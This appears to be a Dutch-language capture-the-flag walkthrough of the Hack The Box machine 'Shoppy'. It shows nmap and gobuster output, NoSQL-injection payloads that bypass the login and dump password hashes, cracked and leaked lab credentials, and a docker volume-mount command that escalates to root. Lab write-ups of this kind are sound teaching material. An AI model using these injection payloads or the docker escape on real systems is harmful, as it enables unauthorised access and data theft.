@@ -1,0 +1,116 @@
+nmap -sC -sV 10.10.11.180
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-07 11:49 EST
+Nmap scan report for 10.10.11.180
+Host is up (0.035s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
+|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
+|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
+80/tcp open  http    nginx 1.23.1
+|_http-server-header: nginx/1.23.1
+|_http-title: Did not follow redirect to http://shoppy.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds
+
+port 22,80 
+
+port 80 geeft een redirect naar shoppy.htb dit voegen we toe in /etc/hotst -> 10.10.11.180	shoppy.htb
+
+We gaan naar de site. De site is een countdown tot wanneer shoppy launched. Hiermee zijn we niet veel.
+We gaan kijken of we vhosts of directories vinden door gebruik te maken van een gobuster enumeration op vhost en dir.
+
+gobuster vhost -u http://shoppy.htb -w /usr/share/wordlists/subdomains.txt
+===============================================================
+Gobuster v3.2.0-dev
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://shoppy.htb
+[+] Method:          GET
+[+] Threads:         10
+[+] Wordlist:        /usr/share/wordlists/subdomains.txt
+[+] User Agent:      gobuster/3.2.0-dev
+[+] Timeout:         10s
+[+] Append Domain:   false
+===============================================================
+2022/11/07 11:52:37 Starting gobuster in VHOST enumeration mode
+===============================================================
+Progress: 4865 / 4998 (97.34%)
+===============================================================
+2022/11/07 11:52:51 Finished
+===============================================================
+
+
+gobuster dir -u http://shoppy.htb -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.2.0-dev
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://shoppy.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.2.0-dev
+[+] Timeout:                 10s
+===============================================================
+2022/11/07 11:53:16 Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 302) [Size: 28] [--> /login]
+/Admin                (Status: 302) [Size: 28] [--> /login]
+/ADMIN                (Status: 302) [Size: 28] [--> /login]
+/assets               (Status: 301) [Size: 179] [--> /assets/]
+/css                  (Status: 301) [Size: 173] [--> /css/]
+/exports              (Status: 301) [Size: 181] [--> /exports/]
+/favicon.ico          (Status: 200) [Size: 213054]
+/fonts                (Status: 301) [Size: 177] [--> /fonts/]
+/images               (Status: 301) [Size: 179] [--> /images/]
+/js                   (Status: 301) [Size: 171] [--> /js/]
+/login                (Status: 200) [Size: 1074]
+/Login                (Status: 200) [Size: 1074]
+Progress: 4505 / 4615 (97.62%)
+===============================================================
+2022/11/07 11:53:31 Finished
+===============================================================
+
+We hebben access aan een login pagina. En een admin pagina als we ingelogged zijn. Een ' zorgt ervoor dat de pagina blijft laden. Dit betekend dat we sql injection hebben in het username field. Sql injection querries lijken niet te werken. We proberen nosqli querries. 
+
+admin' || ' or 1==1:abc dit geeft ons een login in het admin platform.
+
+Een ' in de searchbar in het admin platform geeft een internal server error. Er is hier vermoedelijk weer nosqli we geven a' || ' 1==1 in dit geef een export:
+
+[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
+
+als we dit in hashcat geven vinden we het wachtwoord voor josh:
+
+josh:remembermethisway
+
+we proberen een ssh connectie te maken met deze credentials. Dit lukt niet. 
+
+We proberen een vhost enumeration met een grotere lijst van vhosts. Dit geeft:
+
+
+In de mattermost chats vinden we de credentials jaeger:Sh0ppyBest@pp!
+
+We proberen dit in ssh dit lukt. sudo -l geeft 
+
+jaeger@shoppy:~$ sudo -l
+[sudo] password for jaeger: 
+Matching Defaults entries for jaeger on shoppy:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jaeger may run the following commands on shoppy:
+    (deploy) /home/deploy/password-manager
+
+als we strings gebruiken op password-manager dan zien we een pad naar /home/deploy/creds.txt
+
+en als we met r2 op de attacker machine de binairy bekijken zien we dat het wachtwoord Sample is. Dit geeft ons als credentials deploy:Deploying@pp!
+
+De machine heeft ook docker dit kan gebruikt worden voor priv esk gtfobins geeft ons het volgende commando als we shell access hebben: 
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+dit geeft ons rooted access!
